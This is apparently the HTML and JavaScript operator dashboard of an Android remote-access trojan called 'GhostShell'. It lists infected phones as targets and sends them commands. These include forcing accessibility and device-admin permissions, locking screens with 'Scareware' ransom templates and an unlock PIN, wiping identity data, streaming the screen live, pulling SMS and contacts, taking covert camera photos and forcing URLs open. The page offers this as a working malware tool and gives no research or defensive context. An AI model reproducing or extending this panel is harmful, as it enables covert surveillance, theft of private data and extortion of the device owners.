<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GhostShell_BASE :: Control</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Share Tech Mono', monospace; }
        :root { --bg: #050505; --surface: #0a0a0a; --primary: #00ff33; --danger: #ff003c; --text: #e0e0e0; --dim: #557755; }
        body { background: var(--bg); color: var(--text); padding: 15px; background-image: linear-gradient(rgba(0, 255, 51, 0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 255, 51, 0.03) 1px, transparent 1px); background-size: 20px 20px; }
        .app-container { max-width: 1000px; margin: 0 auto; display: flex; flex-direction: column; gap: 20px; }
        .panel { background: var(--surface); border: 1px solid var(--dim); padding: 20px; position: relative; }
        .panel::before { content:''; position:absolute; top:-1px; left:-1px; width:15px; height:15px; border-top: 2px solid var(--primary); border-left: 2px solid var(--primary); }
        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--primary); }
        .header h1 { font-size: 1.3rem; color: var(--primary); text-transform: uppercase; }
        .device-item { background: #111; padding: 15px; border-radius: 4px; margin-bottom: 10px; cursor: pointer; border-left: 4px solid #333; transition: 0.2s; }
        .device-item:hover { border-color: var(--primary); background: #162216; }
        .sys-title { border-bottom: 1px dashed var(--dim); padding-bottom: 8px; margin-bottom: 15px; font-size: 0.9rem; color: var(--primary); }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 10px; }
        .btn { background: #0a0a0a; border: 1px solid #333; padding: 15px 5px; text-align: center; color: var(--dim); cursor: pointer; font-size: 0.8rem; transition: 0.2s; }
        .btn i { display: block; font-size: 1.5rem; margin-bottom: 8px; color: var(--primary); opacity: 0.8; }
        .btn:hover { border-color: var(--primary); color: var(--primary); box-shadow: inset 0 0 10px rgba(0,255,51,0.1); }
        .terminal { background: #000; color: var(--primary); padding: 12px; height: 200px; overflow-y: auto; border: 1px solid #222; font-size: 0.75rem; white-space: pre-wrap; margin-top: 10px; }
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 100; align-items: center; justify-content: center; padding: 15px; }
        .modal-card { background: #050505; width: 100%; max-width: 600px; border: 1px solid var(--primary); display: flex; flex-direction: column; }
        .modal-header { padding: 15px; background: #0a0a0a; display: flex; justify-content: space-between; border-bottom: 1px solid #222; }
        .modal-body { padding: 20px; overflow-y: auto; }
        .modal-footer { padding: 15px; display: flex; gap: 10px; border-top: 1px solid #222; }
        .action-btn { background: transparent; color: var(--primary); border: 1px solid var(--primary); padding: 8px 15px; cursor: pointer; font-weight: bold; text-transform: uppercase; }
        .action-btn.red { border-color: var(--danger); color: var(--danger); }
        input, select, textarea { background: #000; border: 1px solid #333; color: var(--primary); padding: 10px; width: 100%; outline: none; margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="app-container">
        <header class="panel header">
            <h1><i class="fas fa-ghost"></i> GhostShell_BASE_OS</h1>
            <div style="font-size:0.8rem; color:var(--dim);">[UID: <span id="user-display" style="color:var(--primary)"></span>]</div>
        </header>

        <div id="selection-view" class="panel">
            <h3 class="sys-title"><i class="fas fa-radar"></i> TARGETS_ONLINE</h3>
            <div id="device-list">Scanning...</div>
        </div>

        <div id="dashboard-view" class="panel" style="display:none;">
            <div style="display:flex; justify-content:space-between; margin-bottom:15px;">
                <button onclick="backToSelection()" class="action-btn">BACK</button>
                <div style="color:var(--primary); font-size:0.9rem;">TARGET: <span id="sel-info"></span></div>
            </div>
            
            <h3 class="sys-title"><i class="fas fa-bolt"></i> FORCE_PERMISSIONS</h3>
            <div class="grid" style="grid-template-columns: 1fr 1fr; margin-bottom: 20px;">
                <div class="btn" style="border-color:var(--primary)" onclick="cmd('request_accessibility')">
                    <i class="fas fa-universal-access"></i> TRIGGER ACCESSIBILITY
                </div>
                <div class="btn" style="border-color:var(--primary)" onclick="cmd('request_admin')">
                    <i class="fas fa-user-shield"></i> TRIGGER DEVICE ADMIN
                </div>
            </div>

            <h3 class="sys-title"><i class="fas fa-microchip"></i> EXECUTE_PAYLOAD</h3>
            <div class="grid" id="main-grid"></div>

            <h3 class="sys-title" style="margin-top:25px;"><i class="fas fa-terminal"></i> REALTIME_LOGS</h3>
            <div id="main-log" class="terminal"></div>
        </div>
    </div>

    <div id="modal" class="modal">
        <div class="modal-card">
            <div class="modal-header"><h3 id="modal-title">MODAL</h3><span onclick="closeModal()" style="cursor:pointer">&times;</span></div>
            <div class="modal-body" id="modal-body"></div>
            <div class="modal-footer" id="modal-footer"></div>
        </div>
    </div>

    <script>
        const myUid = localStorage.getItem('ghost_uid') || 'ghostshell';
        document.getElementById('user-display').innerText = myUid;
        let state = { devices: [] }, selId = null, curMod = null;

        async function cmd(c, b={}) {
            if(!selId) return;
            await fetch('/api/command', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({cmd:c, client_id:selId, ...b})});
        }

        function selectTarget(id) {
            selId = id;
            document.getElementById('selection-view').style.display = 'none';
            document.getElementById('dashboard-view').style.display = 'block';
            document.getElementById('sel-info').innerText = id;
            updateMain();
        }

        function backToSelection() {
            selId = null;
            document.getElementById('dashboard-view').style.display = 'none';
            document.getElementById('selection-view').style.display = 'block';
        }

        function openModal(t) {
            curMod = t;
            const b = document.getElementById('modal-body'), f = document.getElementById('modal-footer');
            document.getElementById('modal').style.display = 'flex';
            document.getElementById('modal-title').innerText = t.toUpperCase();
            b.innerHTML = ""; f.innerHTML = "";

            if(t === 'lock') {
                b.innerHTML = `
                    <p>Template:</p>
                    <select id="ltemplate"><option value="1">Legacy v.1</option><option value="2">Scareware V.2</option><option value="3">Scareware V.3</option></select>
                    <p>Message:</p><textarea id="lmsg">SYSTEM COMPROMISED</textarea>
                    <p>Unlock PIN:</p><input id="lpin" value="1337">
                `;
                f.innerHTML = `<button class="action-btn red" onclick="cmd('lock '+document.getElementById('lmsg').value+'|'+document.getElementById('lpin').value+'|'+document.getElementById('ltemplate').value)">EXECUTE LOCK</button>`;
            } else if(t === 'open_url') {
                b.innerHTML = `<p>URL:</p><input id="ourl" value="https://google.com">`;
                f.innerHTML = `<button class="action-btn" onclick="cmd('openurl '+document.getElementById('ourl').value)">FORCE OPEN</button>`;
            }
        }

        let streamInterval = null;
        function startStream() {
            cmd('start_stream');
            openModal('stream');
            document.getElementById('modal-body').innerHTML = `<div style="text-align:center"><img id="stream-view" style="width:100%; border:1px solid var(--primary); background:#000;" src=""></div>`;
            streamInterval = setInterval(async () => {
                if(!selId || curMod !== 'stream') { clearInterval(streamInterval); return; }
                const res = await fetch(`/api/data/${selId}`);
                const d = await res.json();
                if(d.screen) document.getElementById('stream-view').src = "data:image/jpeg;base64," + d.screen;
            }, 800);
        }

        function closeModal() { 
            if(curMod === 'stream') { cmd('stop_stream'); clearInterval(streamInterval); }
            document.getElementById('modal').style.display = 'none'; 
            curMod = null;
        }

        async function poll() {
            try {
                const res = await fetch(`/api/status?owner=${myUid}`);
                state = await res.json();
                document.getElementById('main-log').innerText = state.logs.join('\n');
                document.getElementById('main-log').scrollTop = document.getElementById('main-log').scrollHeight;
                document.getElementById('device-list').innerHTML = state.devices.map(d=>`
                    <div class="device-item" onclick="selectTarget('${d.id}')">
                        <i class="fas fa-mobile"></i> ${d.model} [${d.id}] - ${d.bat}
                    </div>
                `).join('') || "No active targets...";
            } catch(e){}
            setTimeout(poll, 3000);
        }

        function updateMain() {
            const btns = [
                {id:'info', i:'fa-info-circle', l:'SYS INFO'},
                {id:'lock', i:'fa-lock', l:'LOCK DEVICE'},
                {id:'shred', i:'fa-user-secret', l:'IDENTITY SHRED'},
                {id:'stream', i:'fa-desktop', l:'LIVE SCREEN'},
                {id:'sms', i:'fa-sms', l:'GET SMS'},
                {id:'contacts', i:'fa-address-book', l:'CONTACTS'},
                {id:'takefrontpic', i:'fa-video', l:'FRONT CAM'},
                {id:'takebackpic', i:'fa-camera', l:'BACK CAM'},
                {id:'open_url', i:'fa-globe', l:'OPEN URL'}
            ];
            document.getElementById('main-grid').innerHTML = btns.map(b=>`
                <div class="btn" onclick="${b.id==='shred'?'if(confirm(\'SHRED?\'))cmd(\'shred_identity\')':(b.id==='stream'?'startStream()':'openModal(\''+b.id+'\')')}">
                    <i class="fas ${b.i}"></i>${b.l}
                </div>
            `).join('');
        }
        poll();
    </script>
</body>
</html>
